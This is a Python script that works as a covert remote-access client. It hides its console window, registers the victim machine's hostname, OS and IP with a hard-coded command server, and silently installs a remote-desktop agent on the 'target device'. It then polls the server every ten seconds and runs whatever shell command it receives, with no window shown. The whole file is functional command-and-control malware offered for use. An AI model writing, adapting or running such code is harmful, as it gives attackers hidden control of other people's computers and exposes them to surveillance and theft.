import requests
import socket
import platform
import os
import subprocess
import time
import sys

# ========== CONFIGURATION ==========
SERVER_URL = "https://dollar-1rtv.onrender.com"
EXE_NAME = "1"
GROUP_ID = "-1003587821331"  # REPLACE with your actual group ID
# ==================================

# Hide the console window completely
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_computer_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return {
            'hostname': hostname,
            'os': platform.system(),
            'os_version': platform.version(),
            'ip': ip
        }
    except:
        return {
            'hostname': 'Unknown',
            'os': 'Unknown',
            'os_version': 'Unknown',
            'ip': 'Unknown'
        }

def install_pdagent():
    """Install Pocket Desk Agent on the target device automatically"""
    try:
        # Check if pdagent is installed
        result = subprocess.run("where pdagent", shell=True, capture_output=True)
        if result.returncode != 0:
            # Not installed, install it
            subprocess.run("pip install pocket-desk-agent", shell=True, capture_output=True, timeout=120)
            return True
        return True
    except:
        return False

def register_device():
    data = {
        'device_id': socket.gethostname(),
        'exe_name': EXE_NAME,
        'computer_info': get_computer_info(),
        'group_id': GROUP_ID
    }
    try:
        requests.post(f"{SERVER_URL}/register", json=data, timeout=10)
        return True
    except:
        return False

def clear_command(device_id):
    try:
        requests.post(f"{SERVER_URL}/clear_command", json={'device_id': device_id}, timeout=5)
    except:
        pass

def execute_command(command):
    try:
        if command == "START_REMOTE":
            # Install pdagent first if needed
            install_pdagent()
            # Now start the remote session
            # pdagent will auto-install cloudflared via winget if missing [citation:2]
            subprocess.Popen(["pdagent", "remote"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif command == "STOP_REMOTE":
            subprocess.run("taskkill /f /im cloudflared.exe", shell=True, capture_output=True)
        else:
            subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def check_for_commands():
    try:
        response = requests.get(f"{SERVER_URL}/devices", timeout=10)
        all_devices = response.json()
        device_id = socket.gethostname()
        if device_id in all_devices and all_devices[device_id].get('pending_command'):
            command = all_devices[device_id]['pending_command']
            execute_command(command)
            clear_command(device_id)
    except:
        pass

def main():
    register_device()
    # Install pdagent on startup
    install_pdagent()
    while True:
        check_for_commands()
        time.sleep(10)

if __name__ == '__main__':
    main()